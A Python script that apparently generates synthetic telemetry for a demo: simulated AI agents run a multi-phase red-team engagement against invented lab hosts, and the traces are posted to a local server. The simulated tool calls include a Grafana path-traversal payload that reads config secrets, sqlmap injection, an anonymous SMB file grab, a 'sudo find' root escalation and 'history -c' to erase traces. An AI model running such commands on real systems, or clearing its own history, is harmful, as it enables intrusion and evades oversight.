"""Synthetic multi-agent security-assessment simulator for Swain (demo data only).

Everything is invented: targets are RFC 5737 documentation addresses and *.example.test names,
tool outputs are fabricated text, and nothing is executed or sent anywhere except OTLP/JSON
batches to the local Swain server. The engagement is planned in simulated time first (agents
genuinely overlap), then replayed: each span is posted when it would have ended, with
wall-clock timestamps, so the fleet shows agents going active -> ended live.

Usage:
  python3 examples/demo/simulate_team.py --key-file PATH [--server http://127.0.0.1:4318]
                              [--runs 1] [--speed 8] [--gap 20] [--seed N] [--fail-rate 0.0]
"""
import argparse, heapq, json, random, secrets, time, urllib.error, urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("--key-file", required=True)
ap.add_argument("--server", default="http://127.0.0.1:4318")
ap.add_argument("--runs", type=int, default=1, help="engagements (0 = forever)")
ap.add_argument("--speed", type=float, default=8.0, help="time compression factor")
ap.add_argument("--gap", type=float, default=20.0)
ap.add_argument("--seed", type=int, default=None)
ap.add_argument("--fail-rate", type=float, default=0.0, help="chance of an occasional real tool error")
a = ap.parse_args()
R = random.Random(a.seed)
with open(a.key_file, encoding="utf-8") as f:
    SECRET = json.load(f)["secret"]

S = lambda v: {"stringValue": v}
I = lambda v: {"intValue": str(v)}
OPUS, SONNET, HAIKU = "claude-opus-5-5", "claude-sonnet-5-5", "claude-haiku-5-5"


class Plan:
    def __init__(self, name):
        self.trace = secrets.token_hex(16)
        self.name = name
        self.spans = []  # (start_s, end_s, span_dict)

    def add(self, name, parent, start, dur, attrs, err=None, sid=None):
        s = {"traceId": self.trace, "spanId": sid or secrets.token_hex(8), "name": name, "kind": 1,
             "attributes": [{"key": k, "value": v} for k, v in attrs.items()]}
        if parent:
            s["parentSpanId"] = parent
        if err:
            s["status"] = {"code": 2, "message": err}
        self.spans.append((start, start + dur, s))
        return s["spanId"]


class Agent:
    """Runs a script of steps on its own clock; children start at the parent's current time."""

    def __init__(self, plan, name, parent=None, model=SONNET, at=None):
        self.p, self.name, self.model = plan, name, model
        self.id = secrets.token_hex(8)
        self.parent = parent
        self.start = at if at is not None else (parent.t if parent else 0.0)
        self.t = self.start + 0.2

    def think(self, dur, tin, tout, prompt, answer):
        self.p.add(f"chat {self.model}", self.id, self.t, dur, {
            "gen_ai.operation.name": S("chat"), "gen_ai.provider.name": S("anthropic"),
            "gen_ai.request.model": S(self.model),
            "gen_ai.usage.input_tokens": I(tin), "gen_ai.usage.output_tokens": I(tout),
            "gen_ai.input.messages": S(json.dumps([{"role": "user", "parts": [{"type": "text", "content": prompt}]}])),
            "gen_ai.output.messages": S(json.dumps([{"role": "assistant", "parts": [{"type": "text", "content": answer}]}])),
        })
        self.t += dur + 0.1

    def run(self, tool, args, result, dur, err=None):
        if err is None and a.fail_rate and R.random() < a.fail_rate:
            err, result = "exit 124: timed out", result.split("\n")[0] + "\n... (timed out)"
        self.p.add(f"execute_tool {tool}", self.id, self.t, dur, {
            "gen_ai.operation.name": S("execute_tool"), "gen_ai.tool.name": S(tool),
            "gen_ai.tool.call.id": S("toolu_" + secrets.token_hex(6)),
            "gen_ai.tool.call.arguments": S(args), "gen_ai.tool.call.result": S(result),
        }, err)
        self.t += dur + 0.1

    def sh(self, cmd, out, dur, err=None):
        self.run("Bash", cmd, out, dur, err)

    def spawn(self, name, model=SONNET):
        return Agent(self.p, name, self, model)

    def wait_for(self, *kids):
        self.t = max([self.t] + [k.t for k in kids]) + 0.3

    def finish(self):
        self.p.add(f"invoke_agent {self.name}", self.parent.id if self.parent else None,
                   self.start, self.t - self.start, {
                       "gen_ai.operation.name": S("invoke_agent"), "gen_ai.agent.name": S(self.name),
                       "gen_ai.provider.name": S("anthropic"), "gen_ai.request.model": S(self.model)},
                   sid=self.id)


def engagement(n):
    org = R.choice(["acme", "orbital", "northwind", "globex", "initech", "umbrella"])
    dom = f"{org}.example.test"
    net = f"192.0.2.{R.choice([0, 64, 128])}/26"
    h1, h2, h3 = (f"192.0.2.{R.randint(2, 62)}" for _ in range(3))
    ext = f"198.51.100.{R.randint(2, 250)}"
    plan = Plan(f"eng-{n:02d}-{org}")

    # ---------------- lead: scope, plan, task list -------------------------------------------
    lead = Agent(plan, "lead", model=OPUS, at=0.0)
    lead.run("Read", "engagement/rules-of-engagement.md",
             f"Client: {org.title()} (lab replica)\nIn scope: {net}, {ext}, *.{dom}\n"
             "Out of scope: DoS, social engineering, prod-db.{dom}\nWindow: lab only, 09:00-18:00".replace("{dom}", dom), 0.6)
    lead.run("Read", "engagement/previous-findings.md", "2025 test: weak TLS config on vpn, default creds on printer (fixed)", 0.5)
    lead.think(9, 7400, 1300, f"Plan a full assessment of {org} lab: recon, web, vuln research, exploitation in lab, post-ex, report.",
               "Phases: 1) parallel recon (network, DNS, OSINT) 2) web + vuln research 3) controlled exploitation in lab "
               "4) post-exploitation and evidence 5) report. Spawning recon team now.")
    lead.run("TodoWrite", "recon | web | vuln-research | exploit (lab) | post-ex | report",
             "6 tasks created (1 in progress)", 0.3)

    # ---------------- phase 1: recon team in parallel ----------------------------------------
    rn = lead.spawn("recon-net")
    rn.think(2, 1900, 240, f"Map live hosts and services in {net} and {ext}.", "Ping sweep, then full TCP, then version scan on open ports.")
    rn.sh(f"nmap -sn {net}", f"Nmap scan report for {h1}\nNmap scan report for {h2}\nNmap scan report for {h3}\n3 hosts up", 6)
    rn.sh(f"masscan -p1-65535 {h1},{h2},{h3},{ext} --rate 5000",
          f"open tcp 22 {h1}\nopen tcp 80 {h1}\nopen tcp 443 {h1}\nopen tcp 445 {h2}\nopen tcp 3389 {h2}\n"
          f"open tcp 8080 {h3}\nopen tcp 5432 {h3}\nopen tcp 443 {ext}\nopen tcp 1194 {ext}", 38)
    rn.sh(f"nmap -sV -sC -p 22,80,443,445,3389,8080,5432 {h1} {h2} {h3}",
          f"{h1} 22 OpenSSH 9.6p1 | 80 nginx 1.24 | 443 nginx 1.24 (TLS 1.2/1.3)\n"
          f"{h2} 445 Samba 4.15 (signing not required) | 3389 xrdp 0.9\n"
          f"{h3} 8080 Jetty 9.4.43 | 5432 PostgreSQL 13.4", 44)
    rn.sh(f"nmap --script smb-security-mode,smb2-security-mode -p445 {h2}",
          "message_signing: disabled (dangerous, but default)", 7)
    rn.sh(f"nmap -sU --top-ports 50 {h1} {h2}", f"{h2} 161/udp open snmp\n{h1} 123/udp open ntp", 31)
    rn.sh(f"snmpwalk -v2c -c public {h2} 1.3.6.1.2.1.1", "SNMPv2-MIB::sysDescr.0 = Linux files01 5.15.0-lab\nsysContact = it@" + dom, 4)
    rn.run("Write", "notes/recon-net.md", "wrote 2.1 KiB (7 services, 3 notable)", 0.3)
    rn.think(5, 7600, 820, "Summarize network findings.",
             f"Notable: SMB signing disabled on {h2}, SNMP public community on {h2}, outdated Jetty 9.4.43 on {h3}:8080, "
             f"PostgreSQL exposed on {h3}.")
    rn.finish()

    rd = lead.spawn("recon-dns")
    rd.think(1.5, 1500, 160, f"Enumerate subdomains for {dom}.", "Passive first (subfinder, amass), then resolve and probe.")
    rd.sh(f"subfinder -d {dom} -all -silent", "\n".join(f"{s}.{dom}" for s in ["www", "app", "api", "vpn", "staging", "grafana", "git", "mail"]), 11)
    rd.sh(f"amass enum -passive -d {dom}", f"(+2 new) jenkins.{dom}\nold-portal.{dom}", 24)
    rd.sh("dnsx -l subs.txt -a -cname -resp", f"app.{dom} [A] [{h1}]\napi.{dom} [A] [{h1}]\ngrafana.{dom} [A] [{h3}]\n"
          f"jenkins.{dom} [A] [{h3}]\nold-portal.{dom} [CNAME] [legacy-{org}.hosting.example.test]\nvpn.{dom} [A] [{ext}]", 5)
    rd.sh(f"dig axfr {dom} @ns1.{dom}", "; Transfer failed.", 2)
    rd.sh("httpx -l hosts.txt -title -status-code -tech-detect -follow-redirects",
          f"https://app.{dom} [200] [{org.title()} Portal] [nginx,React]\nhttps://api.{dom} [401] [] [express]\n"
          f"https://grafana.{dom} [200] [Grafana] [Grafana 8.3.0]\nhttps://jenkins.{dom} [403] [] [Jenkins 2.319]\n"
          f"https://old-portal.{dom} [404] [] [hosting-provider]\nhttps://staging.{dom} [403] [] [nginx]", 13)
    rd.sh("gowitness file -f live.txt --screenshot-path shots/", "6 screenshots saved to shots/", 16)
    rd.run("Write", "notes/recon-dns.md", "wrote 1.6 KiB (10 subdomains, 6 live)", 0.3)
    rd.think(4, 5200, 610, "Summarize DNS/web surface.",
             f"Interesting: grafana.{dom} runs Grafana 8.3.0, jenkins.{dom} exposed (403), old-portal.{dom} dangling CNAME "
             "(possible subdomain takeover, verify only).")
    rd.finish()

    os_ = lead.spawn("osint", HAIKU)
    os_.think(1, 1100, 120, f"Passive OSINT on {org}.", "Certificate transparency, public repos, employee naming convention.")
    os_.run("WebFetch", f"https://crt.example.test/?q=%25.{dom}&output=json", f"34 certificates; SANs include vpn, jenkins, grafana, old-portal", 6)
    os_.run("WebSearch", f'"{dom}" site:git.example.test password OR apikey', "1 result: public repo 'infra-scripts' mentions grafana admin user", 5)
    os_.run("WebFetch", f"https://git.example.test/{org}/infra-scripts/README.md",
            "Deploy notes: grafana admin user 'admin'; password rotated quarterly (value not present)", 4)
    os_.sh(f"theHarvester -d {dom} -b crtsh,duckduckgo -l 200", f"Emails: it@{dom}, j.doe@{dom}, a.smith@{dom}\nFormat: first-initial.lastname", 18)
    os_.run("Write", "notes/osint.md", "wrote 0.9 KiB", 0.3)
    os_.think(3, 2600, 380, "Summarize OSINT.", "Email format known; infra repo references grafana admin; no secrets exposed.")
    os_.finish()

    lead.wait_for(rn, rd, os_)
    lead.run("Read", "notes/recon-net.md", "(7 services, 3 notable)", 0.3)
    lead.run("Read", "notes/recon-dns.md", "(10 subdomains, 6 live)", 0.3)
    lead.think(7, 14800, 980, "Merge recon and decide phase 2.",
               f"Phase 2: web team on app/api/grafana, vuln research on Grafana 8.3.0 and Jetty 9.4.43, "
               f"verify old-portal CNAME. SMB/SNMP findings go straight to report.")
    lead.run("TodoWrite", "recon ✓ | web ▶ | vuln-research ▶ | exploit | post-ex | report", "updated 3 tasks", 0.2)

    # ---------------- phase 2: web team + vuln research in parallel --------------------------
    web = lead.spawn("web")
    web.think(2, 3300, 300, f"Assess app.{dom} and api.{dom}.", "Headers, content discovery, crawl, then hand parameters to web-params.")
    web.sh(f"curl -skI https://app.{dom}/", "HTTP/2 200\nserver: nginx\nset-cookie: sid=...; HttpOnly\nx-frame-options: SAMEORIGIN\n(no content-security-policy)", 1.5)
    web.sh(f"whatweb https://app.{dom}", "nginx, React, Express API backend, JWT in Authorization header", 3)
    web.sh(f"ffuf -u https://app.{dom}/FUZZ -w raft-medium-directories.txt -mc 200,204,301,302,403 -t 50",
           "admin [403]\napi [301]\nbackup [403]\nlogin [200]\nstatic [301]\nswagger [200]\n.git [403]", 42)
    web.sh(f"katana -u https://app.{dom} -d 3 -jc", f"112 URLs; JS endpoints: /api/v1/search, /api/v1/export, /api/v1/users/me", 21)
    web.run("WebFetch", f"https://app.{dom}/swagger", "OpenAPI 3.0: 14 operations; /api/v1/export?format= accepts csv|xlsx|pdf", 2)
    wp = web.spawn("web-params")
    wp.think(1.5, 2200, 240, "Test API parameters.", "Discover hidden params, then injection and XSS checks.")
    wp.sh(f"arjun -u https://api.{dom}/api/v1/search -m GET", "Parameters found: q, limit, sort, debug", 24)
    wp.sh(f"sqlmap -u 'https://api.{dom}/api/v1/search?q=a&sort=name' -p sort --batch --level 2",
          "parameter 'sort' appears to be 'PostgreSQL boolean-based blind' injectable\nback-end DBMS: PostgreSQL 13", 34)
    wp.sh(f"dalfox url 'https://app.{dom}/search?q=test'", "[V] Reflected XSS on parameter q (encoded context, low impact)", 17)
    wp.sh(f"curl -sk 'https://api.{dom}/api/v1/search?q=a&debug=1'", '{"error":"stack trace hidden","debug":true,"query_ms":12}', 1)
    wp.run("Write", "notes/web-params.md", "wrote 1.3 KiB (1 SQLi, 1 reflected XSS, debug flag)", 0.3)
    wp.think(5, 6100, 700, "Assess parameter results.",
             "Confirmed boolean-based SQLi in 'sort' (lab DB only, no data extracted beyond version). Reflected XSS low. "
             "'debug=1' toggles verbose mode.")
    wp.finish()
    web.wait_for(wp)
    web.sh(f"nuclei -u https://app.{dom},https://grafana.{dom} -severity medium,high,critical",
           f"[high] grafana-path-traversal (CVE-2021-43798) https://grafana.{dom}\n[medium] missing-csp\n[medium] cookie-without-secure", 36)
    web.sh(f"nikto -h https://app.{dom} -Tuning 1234", "+ /backup/: Directory indexing disabled (403)\n+ Server leaks version via header", 28)
    web.run("Write", "notes/web.md", "wrote 2.4 KiB", 0.3)
    web.think(6, 9400, 1050, "Summarize web.", f"High: SQLi on api sort param; High: Grafana 8.3.0 path traversal (needs lab verification). "
              "Medium: missing CSP, cookie flags.")
    web.finish()

    vr = lead.spawn("vuln-research")
    vr.think(2, 2400, 300, "Research Grafana 8.3.0 and Jetty 9.4.43.", "Check advisories and local exploit DB, rate exploitability.")
    vr.sh("searchsploit grafana 8.3", "Grafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py", 2)
    vr.run("WebSearch", "Grafana 8.3.0 CVE-2021-43798 advisory", "Advisory: unauthenticated path traversal via /public/plugins/<id>/; fixed in 8.3.1", 4)
    vr.sh("searchsploit jetty 9.4.43", "Jetty 9.4.37-9.4.43 - Information Disclosure (CVE-2021-34429)", 2)
    vr.run("WebSearch", "Jetty 9.4.43 CVE-2021-34429", "WEB-INF content disclosure via encoded paths; fixed in 9.4.44", 4)
    vr.run("Grep", "pattern='grafana|jetty' path=notes/", "notes/recon-net.md:5 Jetty 9.4.43\nnotes/recon-dns.md:3 Grafana 8.3.0", 0.4)
    vr.run("Write", "notes/vuln-research.md", "wrote 1.8 KiB (2 CVEs, ranked)", 0.3)
    vr.think(4, 5300, 640, "Rank findings.", "1) CVE-2021-43798 Grafana file read — high, verify read of /etc/passwd only. "
             "2) CVE-2021-34429 Jetty disclosure — medium.")
    vr.finish()

    lead.wait_for(web, vr)
    lead.think(6, 18200, 900, "Approve controlled exploitation in lab.",
               "Approved: verify Grafana file read (non-sensitive file), verify SQLi impact read-only, test SMB null session. "
               "No persistence, no data exfiltration beyond evidence.")
    lead.run("TodoWrite", "web ✓ | vuln-research ✓ | exploit ▶", "updated 3 tasks", 0.2)

    # ---------------- phase 3: exploitation (lab, evidence only) ----------------------------
    ex = lead.spawn("exploit")
    ex.think(2, 4100, 420, "Verify Grafana CVE-2021-43798 in lab.", "Request a harmless file through the plugin path to confirm read.")
    ex.sh(f"curl -sk --path-as-is https://grafana.{dom}/public/plugins/alertlist/../../../../../../../../etc/hostname",
          "grafana-lab01", 1.2)
    ex.sh(f"curl -sk --path-as-is https://grafana.{dom}/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini | grep -E '^(admin_user|secret_key)'",
          "admin_user = admin\nsecret_key = [present, redacted in evidence]", 1.4)
    ex.run("Write", "evidence/grafana-file-read.txt", "wrote 0.4 KiB (hostname + redacted config lines)", 0.3)
    ex.sh(f"sqlmap -u 'https://api.{dom}/api/v1/search?q=a&sort=name' -p sort --batch --current-user --current-db",
          "current user: 'app_ro'\ncurrent database: 'portal'", 41)
    ex.sh(f"smbclient -N -L //{h2}", "Sharename  Type  Comment\nshared     Disk  Team share\nIPC$       IPC   IPC Service\nAnonymous login successful", 3)
    ex.sh(f"smbclient -N //{h2}/shared -c 'ls'", "  onboarding.pdf   41231\n  deploy-notes.txt  2210\n  scripts/          D", 2)
    ex.sh(f"smbclient -N //{h2}/shared -c 'get deploy-notes.txt -'",
          "Jenkins agent setup: user 'svc-build', see vault for password\nGrafana datasource uses app_ro role", 2)
    ex.run("Write", "evidence/smb-null-session.txt", "wrote 0.6 KiB", 0.3)
    ex.think(5, 9900, 760, "Summarize exploitation.",
             "Confirmed: Grafana arbitrary file read (high), SQLi as read-only DB role 'app_ro' (high), anonymous SMB share "
             "with internal notes (medium). Foothold path: grafana config -> datasource creds (not used).")
    ex.finish()

    # ---------------- phase 4: post-exploitation on the lab foothold ------------------------
    pe = lead.spawn("post-ex")
    pe.t = ex.t + 0.3
    pe.think(2, 3600, 380, f"Assess impact from lab foothold on {h1} (provided lab test account).",
             "Enumerate privileges and misconfigurations; collect evidence only.")
    pe.sh(f"ssh -i lab_key tester@{h1} 'id; uname -a; sudo -l'",
          "uid=1001(tester) gid=1001(tester) groups=1001(tester),27(sudo-lab)\nLinux web01 5.15.0-lab x86_64\n"
          "(root) NOPASSWD: /usr/bin/find", 3)
    pe.sh(f"ssh -i lab_key tester@{h1} 'bash linpeas.sh -q -o sysinfo,procs_crons_timers_srvcs_sockets'",
          "[+] sudo NOPASSWD /usr/bin/find (GTFOBins)\n[+] Cron: /opt/backup.sh writable by group 'deploy'\n[+] Docker socket not present", 29)
    pe.sh(f"ssh -i lab_key tester@{h1} 'sudo find /root -maxdepth 0 -exec id \\;'", "uid=0(root) gid=0(root) groups=0(root)", 1.5)
    pe.sh(f"ssh -i lab_key tester@{h1} 'ls -la /opt/backup.sh'", "-rwxrwxr-x 1 root deploy 412 Nov 10 /opt/backup.sh", 1)
    pe.run("Write", "evidence/privesc-sudo-find.txt", "wrote 0.3 KiB", 0.3)
    pe.sh(f"ssh -i lab_key tester@{h1} 'rm -f /tmp/linpeas.sh; history -c'", "", 0.8)
    pe.think(4, 6800, 690, "Summarize post-ex.",
             f"Privilege escalation to root on {h1} via sudo find (high). Group-writable root cron script (high). "
             "Cleanup done.")
    pe.finish()

    lead.wait_for(ex, pe)
    lead.think(5, 21400, 820, "Review evidence and start report.", "Evidence complete for 7 findings. Spawning reporter.")
    lead.run("TodoWrite", "exploit ✓ | post-ex ✓ | report ▶", "updated 3 tasks", 0.2)

    # ---------------- phase 5: report --------------------------------------------------------
    rep = lead.spawn("reporter")
    for f, s in [("notes/recon-net.md", "7 services"), ("notes/recon-dns.md", "10 subdomains"), ("notes/osint.md", "emails"),
                 ("notes/web.md", "web"), ("notes/vuln-research.md", "2 CVEs"), ("evidence/grafana-file-read.txt", "evidence"),
                 ("evidence/smb-null-session.txt", "evidence"), ("evidence/privesc-sudo-find.txt", "evidence")]:
        rep.run("Read", f, f"({s})", 0.3)
    rep.think(28, 31800, 4200, "Write the engagement report.",
              f"{org.title()} lab assessment: 3 high (Grafana file read, SQLi, sudo find privesc), 2 high-config "
              "(writable root cron), 3 medium (SMB null session, SNMP public, missing CSP), 2 low. Remediation per finding.")
    rep.run("Write", f"report/{plan.name}.md", "wrote 14.8 KiB (executive summary, 10 findings, remediation, appendix)", 0.6)
    rep.run("Edit", f"report/{plan.name}.md", "updated CVSS for SQLi 7.5 -> 8.1 after evidence review", 0.4)
    rep.sh(f"pandoc report/{plan.name}.md -o report/{plan.name}.pdf", "", 3)
    rep.finish()

    lead.wait_for(rep)
    lead.think(6, 24600, 900, "Final review.", "Report approved. 10 findings, all with evidence. Engagement closed.")
    lead.run("TodoWrite", "report ✓ (all tasks done)", "6/6 tasks completed", 0.2)
    lead.finish()
    return plan


def post(plan, spans, t0_ns):
    out = []
    for st, en, s in spans:
        s = dict(s)
        s["startTimeUnixNano"] = str(t0_ns + int(st * 1e9))
        s["endTimeUnixNano"] = str(t0_ns + int(en * 1e9))
        out.append(s)
    body = {"resourceSpans": [{"resource": {"attributes": [
        {"key": "service.name", "value": S("redteam-team")}, {"key": "deployment.environment", "value": S("lab")},
        {"key": "engagement.name", "value": S(plan.name)}]},
        "scopeSpans": [{"scope": {"name": "swain-redteam-sim", "version": "2"}, "spans": out}]}]}
    req = urllib.request.Request(a.server + "/v1/traces", data=json.dumps(body).encode(), method="POST",
                                 headers={"Content-Type": "application/json", "Authorization": "Bearer " + SECRET})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def replay(plan):
    total = max(en for _, en, _ in plan.spans)
    tools = sum(1 for *_, s in plan.spans if s["name"].startswith("execute_tool"))
    agents = sum(1 for *_, s in plan.spans if s["name"].startswith("invoke_agent"))
    print(f"\n=== {plan.name}: {agents} agents, {tools} actions, {total/60:.1f} min simulated, "
          f"~{total/a.speed/60:.1f} min real ===", flush=True)
    t0_ns, wall0 = time.time_ns(), time.time()
    queue = sorted(plan.spans, key=lambda x: x[1])
    i = 0
    while i < len(queue):
        due = queue[i][1]
        delay = wall0 + due / a.speed - time.time()
        if delay > 0:
            time.sleep(delay)
        batch = []
        while i < len(queue) and queue[i][1] <= due + 0.5 * a.speed:
            batch.append(queue[i]); i += 1
        code = post(plan, batch, t0_ns)
        for _, _, s in batch:
            if s["name"].startswith(("execute_tool", "invoke_agent")):
                args = next((x["value"]["stringValue"] for x in s["attributes"] if x["key"] == "gen_ai.tool.call.arguments"), "")
                print(f"  +{due:6.1f}s  {s['name']:<28} {args[:80]}", flush=True)
        if code != 200:
            print(f"  !! HTTP {code}", flush=True)


n = 0
while a.runs == 0 or n < a.runs:
    n += 1
    replay(engagement(n))
    if a.runs == 0 or n < a.runs:
        time.sleep(a.gap)
print("\ndone")
